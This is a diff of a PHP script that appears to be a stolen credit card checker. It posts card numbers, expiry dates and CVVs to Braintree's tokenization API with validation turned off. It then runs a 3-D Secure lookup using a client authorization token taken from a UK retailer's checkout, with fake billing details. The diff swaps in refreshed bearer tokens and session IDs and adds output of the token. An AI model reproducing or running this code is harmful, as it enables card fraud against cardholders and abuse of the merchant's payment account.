@@ -2276,9 +2276,7 @@ $startTime = microtime(true); //TIEMPO DE INICIO
 $BinData = BinData($bin); //Extrae los datos del bin
 
 
-
 $curl = curl_init();
-
 curl_setopt_array($curl, [
   CURLOPT_URL => 'https://payments.braintree-api.com/graphql',
   CURLOPT_RETURNTRANSFER => true,
@@ -2287,18 +2285,17 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"bcd52377-7c10-42f9-bb40-220f5b780c74"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
+  CURLOPT_POSTFIELDS => '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"d362514c-0d88-4bf9-9181-ca0d6ea1ca4b"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
   CURLOPT_HTTPHEADER => [
     'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
-    'Accept-Encoding: gzip, deflate, br, zstd',
     'Content-Type: application/json',
     'sec-ch-ua-platform: "Android"',
-    'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzUzNDc4MDYsImp0aSI6ImEyOTA1NzE3LWJkMmUtNDg1Ny1hY2Q1LTc3NzU5ZmFiMzJkMyIsInN1YiI6InZwOWIzOXI3YzNiOXRtcGoiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InZwOWIzOXI3YzNiOXRtcGoiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImdyYWhhbWFuZGdyZWVuR0JQIn19.XuYx-oW-xiQf72Clu0SjML4knZc4RpIqYPe6_PtXoZ4xIxoLwvH2yMtQlodJkoZOczuhKRgnfK9VnwNANMDjBw',
+    'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzU0Mzg2NTUsImp0aSI6IjdkYzU4MmNmLTQ2ZjItNDUwZi05OGRhLTRjNWJjNWQ2YzM5NiIsInN1YiI6InZwOWIzOXI3YzNiOXRtcGoiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InZwOWIzOXI3YzNiOXRtcGoiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImdyYWhhbWFuZGdyZWVuR0JQIn19.d_W49HOVKZSzeQYMuSccwCP-IRQmONsiNDlVsHJHVueKnQOJLq0hWQuAPUL64ARAUaR-vCoinXAN8wYCGM-QTw',
     'braintree-version: 2018-05-10',
     'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
     'sec-ch-ua-mobile: ?1',
     'sec-gpc: 1',
-    'accept-language: es-US,es;q=0.9',
+    'accept-language: es-US,es;q=0.8',
     'origin: https://assets.braintreegateway.com',
     'sec-fetch-site: cross-site',
     'sec-fetch-mode: cors',
@@ -2308,12 +2305,14 @@ curl_setopt_array($curl, [
   ],
 ]);
 
+
 $response = curl_exec($curl);
 $err = curl_error($curl);
 $json = json_decode($response,true);
 curl_close($curl);
 
 $token = $json["data"]["tokenizeCreditCard"]["token"];
+echo "$token\n";
 
 
 $curl = curl_init();
@@ -2326,7 +2325,7 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => '{"amount":"35.00","additionalInfo":{"billingLine1":"1008 Alum Rock Road","billingCity":"Birmingham","billingPostalCode":"B8 2LS","billingCountryCode":"GB","billingPhoneNumber":"","billingGivenName":"Carlos","billingSurname":"Perez"},"challengeRequested":[true,true],"bin":"518189","dfReferenceId":"0_7980d840-ef23-4cf4-9fd1-e54b01024e38","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.97.2","cardinalDeviceDataCollectionTimeElapsed":4,"issuerDeviceDataCollectionTimeElapsed":0,"issuerDeviceDataCollectionResult":true},"authorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzUzNDc4MDYsImp0aSI6ImEyOTA1NzE3LWJkMmUtNDg1Ny1hY2Q1LTc3NzU5ZmFiMzJkMyIsInN1YiI6InZwOWIzOXI3YzNiOXRtcGoiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InZwOWIzOXI3YzNiOXRtcGoiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImdyYWhhbWFuZGdyZWVuR0JQIn19.XuYx-oW-xiQf72Clu0SjML4knZc4RpIqYPe6_PtXoZ4xIxoLwvH2yMtQlodJkoZOczuhKRgnfK9VnwNANMDjBw","braintreeLibraryVersion":"braintree/web/3.97.2","_meta":{"merchantAppId":"www.grahamandgreen.co.uk","platform":"web","sdkVersion":"3.97.2","source":"client","integration":"custom","integrationType":"custom","sessionId":"bcd52377-7c10-42f9-bb40-220f5b780c74"}}',
+  CURLOPT_POSTFIELDS => '{"amount":"35.00","additionalInfo":{"billingLine1":"1008 Alum Rock Road","billingCity":"Birmingham","billingPostalCode":"B8 2LS","billingCountryCode":"GB","billingPhoneNumber":"","billingGivenName":"Carlos","billingSurname":"Perez"},"challengeRequested":[true,true],"bin":"535318","dfReferenceId":"0_ef339445-a200-4547-9e02-e3a2dbbd9b8e","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.97.2","cardinalDeviceDataCollectionTimeElapsed":1492,"issuerDeviceDataCollectionTimeElapsed":9185,"issuerDeviceDataCollectionResult":true},"authorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzU0Mzg2NTUsImp0aSI6IjdkYzU4MmNmLTQ2ZjItNDUwZi05OGRhLTRjNWJjNWQ2YzM5NiIsInN1YiI6InZwOWIzOXI3YzNiOXRtcGoiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InZwOWIzOXI3YzNiOXRtcGoiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImdyYWhhbWFuZGdyZWVuR0JQIn19.d_W49HOVKZSzeQYMuSccwCP-IRQmONsiNDlVsHJHVueKnQOJLq0hWQuAPUL64ARAUaR-vCoinXAN8wYCGM-QTw","braintreeLibraryVersion":"braintree/web/3.97.2","_meta":{"merchantAppId":"www.grahamandgreen.co.uk","platform":"web","sdkVersion":"3.97.2","source":"client","integration":"custom","integrationType":"custom","sessionId":"d362514c-0d88-4bf9-9181-ca0d6ea1ca4b"}}',
   CURLOPT_HTTPHEADER => [
     'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
     'Accept-Encoding: gzip, deflate, br, zstd',
@@ -2335,7 +2334,7 @@ curl_setopt_array($curl, [
     'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
     'sec-ch-ua-mobile: ?1',
     'sec-gpc: 1',
-    'accept-language: es-US,es;q=0.9',
+    'accept-language: es-US,es;q=0.8',
     'origin: https://www.grahamandgreen.co.uk',
     'sec-fetch-site: cross-site',
     'sec-fetch-mode: cors',
